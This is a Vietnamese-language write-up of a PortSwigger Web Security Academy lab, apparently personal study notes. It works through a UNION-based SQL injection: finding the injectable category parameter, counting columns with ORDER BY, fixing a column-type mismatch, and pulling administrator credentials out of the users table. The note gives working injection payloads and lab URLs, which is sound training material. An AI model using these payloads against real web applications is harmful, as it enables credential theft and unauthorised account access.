![[Pasted image 20260601202402.png]]
# Tổng quan về lab
-Đầu tiên ta truy cập vào lab sử dụng các chứng năng như một client.Khi bấm vào Corporate gifts thì ta thấy ở url:
```LINK
https://0ad6007803981eea811802f900410077.web-security-academy.net/filter?category=Gifts
```
Ta thấy có phần `category=Gifts` rất đáng nghi đây là một lỗi về SQLi,ta thử 
`OR 1=1--` vào url:
```LINK
https://0adc00c1049a670880b8621d0024005d.web-security-academy.net/filter?category=Gifts'+OR+1=1--
```
Ta thấy nó hiện ra tất cả các mục => SQLi
Mục tiêu của lab: dùng `UNION ATTACK` để lấy ra `username` và `password`,sử dụng dữ liệu đã khai thác để đăng nhập vào tài khoản administrator

# Khai thác:
Trước hết ta dùng `ORDER BY 1,2,3,...--` xác định số cột của câu truy vấn trước khi dùng UNION
```LINK
https://0ad6007803981eea811802f900410077.web-security-academy.net/filter?category=Gifts'+ORDER+BY+1--
https://0ad6007803981eea811802f900410077.web-security-academy.net/filter?category=Gifts'+ORDER+BY+2--
```
Cho đến khi `ORDER+BY+3--`:
![[Pasted image 20260601210615.png]]

=>Câu truy vấn trước có 2 cột,ta dùng `UNION SELECT` với 2 cột và tác giả đã cho biết sẵn là bảng users có 2 cột là username và password ta thử:
```SQL
' UNION SELECT username,password FROM users--
```
![[Pasted image 20260601214052.png]]
Nhưng vấn đề là vẫn gặp lỗi `Internal Server Error` có vẻ như lỗi nằm ở chúng ta không để ý kỹ phần kiểu dữ liệu của từng cột sau nhiều lần thử thì ta thấy:
```SQL
' UNION SELECT 123,'abc' FROM users--
```
![[Pasted image 20260601214420.png]]
=> câu truy vấn đầu tiên có cột 1 là kiểu dữ liệu số,cột 2 là kiểu dữ liệu text,Nên ta có thể hiểu UNION ATTACK đầu tiên ta dùng cột 1 là username là dữ liệu text nên không khớp với dữ liệu kiểu số
Vậy cuối cùng ta có `UNION ATTACK` query sau:
```SQL
' UNION SELECT 123,username||'\'||password FROM users--
```
Ta dùng `||'\'||` là dùng để nối username và password để đưa 2 cái vào cùng 1 cột lúc này:
![[Pasted image 20260601214913.png]]
=> ta thấy tài khoản `administrator` và mật khẩu được ngăn bởi dấu `\` vậy ta chỉ cần đăng nhập là xong
![[Pasted image 20260601215026.png]]
=>solved!